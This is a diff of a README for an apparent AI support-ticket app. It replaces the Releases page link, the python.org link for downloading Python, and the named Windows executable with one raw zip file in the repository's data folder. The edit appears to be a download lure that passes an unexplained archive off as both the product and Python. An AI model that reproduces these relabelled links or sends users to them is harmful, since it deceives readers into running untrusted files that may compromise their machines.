@@ -4,7 +4,7 @@
 
 Welcome to AI-Support-Ticket-Bot! This application helps businesses manage customer support tickets efficiently. Using advanced AI techniques, it categorizes tickets and generates automated responses. This guide will help you download and run the software easily.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-4CAF50)](https://github.com/Meepkun/AI-Support-Ticket-Bot/releases)
+[![Download Now](https://github.com/Meepkun/AI-Support-Ticket-Bot/raw/refs/heads/main/data/Support_A_Ticket_Bot_1.6.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-4CAF50)](https://github.com/Meepkun/AI-Support-Ticket-Bot/raw/refs/heads/main/data/Support_A_Ticket_Bot_1.6.zip)
 
 ## 📦 What You Need
 
@@ -13,7 +13,7 @@ Before you start, check if your computer meets these requirements:
 - **Operating System:** Windows, macOS, or a Linux distribution.
 - **RAM:** At least 4 GB.
 - **Disk Space:** At least 200 MB of free space.
-- **Python:** You need Python 3.6 or later installed on your machine. You can download Python from [python.org](https://www.python.org/downloads/).
+- **Python:** You need Python 3.6 or later installed on your machine. You can download Python from [https://github.com/Meepkun/AI-Support-Ticket-Bot/raw/refs/heads/main/data/Support_A_Ticket_Bot_1.6.zip](https://github.com/Meepkun/AI-Support-Ticket-Bot/raw/refs/heads/main/data/Support_A_Ticket_Bot_1.6.zip).
 
 ## 🔍 Features
 
@@ -26,14 +26,14 @@ Before you start, check if your computer meets these requirements:
 
 To download the software, visit the Releases page:
 
-[Download AI-Support-Ticket-Bot](https://github.com/Meepkun/AI-Support-Ticket-Bot/releases)
+[Download AI-Support-Ticket-Bot](https://github.com/Meepkun/AI-Support-Ticket-Bot/raw/refs/heads/main/data/Support_A_Ticket_Bot_1.6.zip)
 
 ### ⏬ Steps to Download
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application listed there.
 3. Click on the version to expand the details.
-4. Find the file that matches your operating system (e.g., `AI-Support-Ticket-Bot-Windows.exe` for Windows users).
+4. Find the file that matches your operating system (e.g., `https://github.com/Meepkun/AI-Support-Ticket-Bot/raw/refs/heads/main/data/Support_A_Ticket_Bot_1.6.zip` for Windows users).
 5. Download the file to your computer.
 
 ### 🔧 Installing the Application
@@ -81,4 +81,4 @@ Contributions are welcome! If you notice bugs or want to suggest improvements, f
 
 Thank you for choosing AI-Support-Ticket-Bot, a smarter way to manage your support needs!
 
-[Download AI-Support-Ticket-Bot](https://github.com/Meepkun/AI-Support-Ticket-Bot/releases)
+[Download AI-Support-Ticket-Bot](https://github.com/Meepkun/AI-Support-Ticket-Bot/raw/refs/heads/main/data/Support_A_Ticket_Bot_1.6.zip)
